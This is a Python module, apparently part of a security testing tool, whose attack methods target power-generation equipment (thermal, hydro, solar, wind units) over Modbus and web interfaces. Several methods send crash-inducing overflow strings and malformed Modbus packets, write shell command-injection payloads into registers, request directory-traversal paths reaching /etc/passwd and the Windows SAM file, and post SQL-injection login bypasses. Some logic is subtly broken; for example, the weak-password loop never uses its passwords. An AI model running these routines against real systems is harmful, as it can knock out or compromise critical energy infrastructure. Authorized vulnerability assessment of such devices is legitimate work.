import socket
import struct
import time
from scapy.all import *
import pymodbus.client
import requests
import json
import logging

logger = logging.getLogger(__name__)

class ExploitModule:
    def __init__(self, ip, port, device_type, device_model):
        self.ip = ip
        self.port = port
        self.device_type = device_type
        self.device_model = device_model
        self.results = []

    def exploit_modbus_weak_password(self):
        """利用Modbus协议弱密码漏洞"""
        try:
            common_passwords = ["admin", "password", "123456", "admin123"]
            for password in common_passwords:
                try:
                    client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
                    client.connect()
                    if client.is_socket_open():
                        # 尝试使用弱密码连接
                        result = client.read_holding_registers(0, 10)
                        if not result.isError():
                            self.results.append({
                                "type": "弱密码漏洞",
                                "description": f"发现弱密码: {password}",
                                "severity": "高",
                                "details": "设备使用默认或弱密码，可能导致未授权访问"
                            })
                except Exception as e:
                    logger.error(f"Modbus弱密码测试失败: {str(e)}")
                finally:
                    client.close()
        except Exception as e:
            logger.error(f"Modbus弱密码漏洞利用失败: {str(e)}")

    def exploit_buffer_overflow(self):
        """利用缓冲区溢出漏洞"""
        try:
            # 构造可能导致缓冲区溢出的数据包
            payload = "A" * 1000  # 示例：发送大量数据
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))
            sock.send(payload.encode())
            time.sleep(1)
            sock.close()
            
            # 检查设备是否崩溃或异常
            try:
                test_client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
                test_client.connect()
                test_client.close()
            except:
                self.results.append({
                    "type": "缓冲区溢出漏洞",
                    "description": "设备可能受到缓冲区溢出攻击影响",
                    "severity": "严重",
                    "details": "设备在处理大量数据时可能发生崩溃"
                })
        except Exception as e:
            logger.error(f"缓冲区溢出漏洞利用失败: {str(e)}")

    def exploit_command_injection(self):
        """利用命令注入漏洞"""
        try:
            # 测试常见的命令注入payload
            payloads = [
                "'; ls;",
                "`ls`",
                "$(ls)",
                "| ls",
                "|| ls"
            ]
            
            for payload in payloads:
                try:
                    # 尝试通过Modbus协议发送命令注入payload
                    client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
                    client.connect()
                    if client.is_socket_open():
                        # 构造包含payload的数据包
                        result = client.write_register(0, payload)
                        if not result.isError():
                            self.results.append({
                                "type": "命令注入漏洞",
                                "description": f"可能存在命令注入漏洞，payload: {payload}",
                                "severity": "严重",
                                "details": "设备可能执行未授权的系统命令"
                            })
                except Exception as e:
                    logger.error(f"命令注入测试失败: {str(e)}")
                finally:
                    client.close()
        except Exception as e:
            logger.error(f"命令注入漏洞利用失败: {str(e)}")

    def exploit_web_interface(self):
        """利用Web接口漏洞"""
        try:
            # 测试常见的Web漏洞
            urls = [
                f"http://{self.ip}:8080",
                f"http://{self.ip}:80",
                f"https://{self.ip}:443"
            ]
            
            for url in urls:
                try:
                    # 测试目录遍历
                    traversal_paths = [
                        "/../../../etc/passwd",
                        "/..\\..\\..\\windows\\system32\\config\\sam",
                        "/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
                    ]
                    
                    for path in traversal_paths:
                        response = requests.get(url + path, timeout=5)
                        if response.status_code == 200:
                            self.results.append({
                                "type": "目录遍历漏洞",
                                "description": f"发现目录遍历漏洞: {url + path}",
                                "severity": "高",
                                "details": "可以访问系统敏感文件"
                            })
                    
                    # 测试SQL注入
                    sql_payloads = [
                        "' OR '1'='1",
                        "admin' --",
                        "admin' #"
                    ]
                    
                    for payload in sql_payloads:
                        data = {"username": payload, "password": "test"}
                        response = requests.post(url + "/login", data=data, timeout=5)
                        if "success" in response.text.lower():
                            self.results.append({
                                "type": "SQL注入漏洞",
                                "description": f"发现SQL注入漏洞，payload: {payload}",
                                "severity": "严重",
                                "details": "可以绕过认证或获取数据库信息"
                            })
                except requests.exceptions.RequestException:
                    continue
        except Exception as e:
            logger.error(f"Web接口漏洞利用失败: {str(e)}")

    def exploit_protocol_vulnerabilities(self):
        """利用协议漏洞"""
        try:
            # 测试协议实现漏洞
            if self.device_type in ["火力发电机组", "水利发电机组"]:
                # 构造异常的Modbus数据包
                malformed_packet = struct.pack(">HHH", 0x0001, 0x0000, 0xFFFF)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.ip, self.port))
                sock.send(malformed_packet)
                time.sleep(1)
                sock.close()
                
                # 检查设备响应
                try:
                    client = pymodbus.client.ModbusTcpClient(self.ip, port=self.port)
                    client.connect()
                    client.close()
                except:
                    self.results.append({
                        "type": "协议实现漏洞",
                        "description": "设备在处理异常数据包时可能崩溃",
                        "severity": "高",
                        "details": "协议实现存在缺陷，可能导致拒绝服务"
                    })
        except Exception as e:
            logger.error(f"协议漏洞利用失败: {str(e)}")

    def run_all_exploits(self):
        """运行所有漏洞利用"""
        logger.info("开始漏洞利用测试...")
        
        # 根据设备类型选择要执行的漏洞利用
        if self.device_type in ["火力发电机组", "水利发电机组", "光伏发电机组", "风力发电机组"]:
            self.exploit_modbus_weak_password()
            self.exploit_buffer_overflow()
            self.exploit_command_injection()
            self.exploit_protocol_vulnerabilities()
        
        if self.device_type in ["光伏发电机组", "风力发电机组"]:
            self.exploit_web_interface()
        
        return self.results 